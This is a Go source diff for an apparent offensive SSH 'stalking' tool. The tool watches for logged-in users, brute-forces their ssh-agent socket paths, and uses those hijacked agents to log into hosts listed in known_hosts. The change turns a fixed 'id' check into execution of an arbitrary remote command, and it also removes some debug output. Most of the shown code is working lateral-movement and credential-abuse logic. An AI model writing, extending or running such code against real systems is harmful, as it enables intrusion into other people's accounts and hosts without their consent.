@@ -121,7 +121,7 @@ type Who struct {
 	Time int32
 }
 
-type StalkRemoteLoginAction func(string) map[string][]sshLoginSuccess
+type StalkRemoteLoginAction func(string, string) map[string][]sshLoginSuccess
 
 // StalkRemoteLoginParams holds options for the StalkRemoteLogin functionality.
 type StalkRemoteLoginParams struct {
@@ -133,6 +133,8 @@ type StalkRemoteLoginParams struct {
 	LoginLimit uint
 	// Frequency to look for the user to be logged in
 	PollFrequency uint
+	// Command to execute on remote host upon successful login.
+	RemoteCommand string
 	// Only attempt logins as this user. If user is "*", try to stalk any user.
 	User string
 }
@@ -458,7 +460,6 @@ func getSSHSockByBruteForce(user, dirPattern string) map[string][]string {
 			found[userStr] = append(found[userStr], s)
 		}
 	}
-	fmt.Println(found)
 	return found
 }
 
@@ -479,11 +480,11 @@ func getSSHSocketByPid(pid int32) (string, error) {
 	return string(sub[:bytes.Index(sub, []byte("\x00"))]), nil
 }
 
-// sshLoginWithAgent will attempt to find a valid ssh-agent for the logged-in
+// sshExecWithAgent will attempt to find a valid ssh-agent for the logged-in
 // user and use that to log into the specified host as the user himself.
 // There is currently no support for logging into host H as user X with user
 // Y's ssh-agent.
-func sshLoginWithAgent(user string, host Host) (string, error) {
+func sshExecWithAgent(user string, host Host, cmd string) (string, error) {
 	var sockPaths map[string][]string
 	/*
 		path, err := getSSHSocketByPid(login.pid)
@@ -506,7 +507,6 @@ func sshLoginWithAgent(user string, host Host) (string, error) {
 
 			agent := agent.NewClient(sock)
 
-			fmt.Println("here0")
 			signers, err := agent.Signers()
 			if err != nil {
 				fmt.Println(err)
@@ -527,26 +527,23 @@ func sshLoginWithAgent(user string, host Host) (string, error) {
 			} else {
 				hostStr = fmt.Sprintf("[%s]", host.Ip)
 			}
-			fmt.Println("here1")
 			client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", hostStr, host.Port), config)
 			if err != nil {
-				fmt.Printf("Failed to dial: %v", err)
+				fmt.Printf("Failed to dial: %v\n", err)
 				continue
 			}
 
-			fmt.Println("here2")
 			session, err := client.NewSession()
 			if err != nil {
-				fmt.Printf("Failed to create session: %v", err)
+				fmt.Printf("Failed to create session: %v\n", err)
 				continue
 			}
 			defer session.Close()
 
 			var b bytes.Buffer
 			session.Stdout = &b
-			cmd := "id"
 			if err := session.Run(cmd); err != nil {
-				fmt.Printf("Failed to run cmd: %s: %v", cmd, err)
+				fmt.Printf("Failed to run cmd: %s: %v\n", cmd, err)
 				continue
 			}
 			fmt.Println(b.String())
@@ -554,10 +551,13 @@ func sshLoginWithAgent(user string, host Host) (string, error) {
 		}
 	}
 	var msg = ""
+	var plural = ""
 	if len(sockPaths) == 0 {
-		msg = "no "
+		msg = "out "
+	} else if len(sockPaths) > 1 {
+		plural = "s"
 	}
-	return "", fmt.Errorf("failed to login with %sagents", msg)
+	return "", fmt.Errorf("failed to login with%s agent%s", msg, plural)
 }
 
 // sshKnownHosts attempts to fetch all the known_hosts files for all users on
@@ -819,28 +819,31 @@ func StalkRemoteLogin(p StalkRemoteLoginParams) error {
 		case <-ticker.C:
 			// If the user in question is logged in, attempt to login to any host we know about
 			if isUserLoggedIn(p.User) {
-				fmt.Println(p.Action(p.User))
+				p.Action(p.User, p.RemoteCommand)
 				attempts++
 			}
-			fmt.Println(attempts, p.LoginLimit)
 		}
 	}
 	return nil
 }
 
-// AttemptRemoteLogin will wait for signs that a user that can be hijacked is logged in.
+// AttemptRemoteExec will wait for signs that a user that can be hijacked is logged in.
 // This means either a user with an ssh-agent running or with a ControlMaster socket active.
-func AttemptRemoteLogin(user string) map[string][]sshLoginSuccess {
+func AttemptRemoteExec(user, cmd string) map[string][]sshLoginSuccess {
 	hosts := getCandidateRHosts()
 	loggedIn := GetWho()
 	found := map[string][]sshLoginSuccess{}
-	fmt.Println(loggedIn)
-	fmt.Println(hosts)
+	// Only attempt exec once per user even if user has multiple login sessions.
+	uniqUsers := map[string]bool{}
 	for _, host := range hosts {
 		for _, login := range loggedIn {
+			if _, ok := uniqUsers[login.User]; ok {
+				continue
+			}
+			uniqUsers[login.User] = true
 			if user == login.User || user == "*" {
 				// Look for an ssh-agent running under this login session
-				sockPath, err := sshLoginWithAgent(user, host)
+				sockPath, err := sshExecWithAgent(user, host, cmd)
 				if err == nil {
 					found[user] = append(found[login.User], sshLoginSuccess{
 						host: host,
